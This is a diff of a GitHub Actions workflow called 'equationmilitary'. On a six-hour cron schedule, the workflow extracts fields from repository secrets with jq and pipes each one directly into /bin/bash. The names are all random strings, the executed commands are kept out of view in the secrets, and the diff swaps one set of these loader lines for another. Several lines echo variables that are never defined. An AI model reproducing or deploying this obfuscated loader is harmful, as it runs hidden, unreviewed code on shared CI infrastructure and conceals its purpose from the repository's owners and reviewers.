@@ -1,27 +1,25 @@
 name: equationmilitary
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 4/6 * * *'
-
+    - cron: '14 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: equationmilitary
         env:
-          sqpj67974: ${{ secrets.sqpj67974 }}
+          snly58: ${{ secrets.snly58 }}
         run: |
-          echo $sqpj67974 | jq -r .yu48 | /bin/bash
-          echo $zdaiv3 | jq -r .s6694 | /bin/bash
-          echo $ni6100 | jq -r .as50 | /bin/bash
-          echo $uziup45 | jq -r .cow08 | /bin/bash
-          echo $te2390 | jq -r .ngab97 | /bin/bash
-          echo $a52 | jq -r .qkt7 | /bin/bash
-          echo $chig6 | jq -r .njnr0 | /bin/bash
-          echo $nqzmf2 | jq -r .xwzv3264 | /bin/bash
-          echo $pd171 | jq -r .gdppq3307 | /bin/bash
-          echo $pudh617 | jq -r .reput89825 | /bin/bash
-          echo $z6617 | jq -r .bd1 | /bin/bash
+          echo $snly58 | jq -r .ldw68677 | /bin/bash
+          echo $kvvr65 | jq -r .ek105 | /bin/bash
+          echo $qouj8524 | jq -r .vn47 | /bin/bash
+          echo $rn8 | jq -r .gdd282 | /bin/bash
+          echo $fp0563 | jq -r .vpl67544 | /bin/bash
+          echo $d8852 | jq -r .bn43506 | /bin/bash
+          echo $mle6 | jq -r .q88 | /bin/bash
+          echo $vz60 | jq -r .i1 | /bin/bash
 
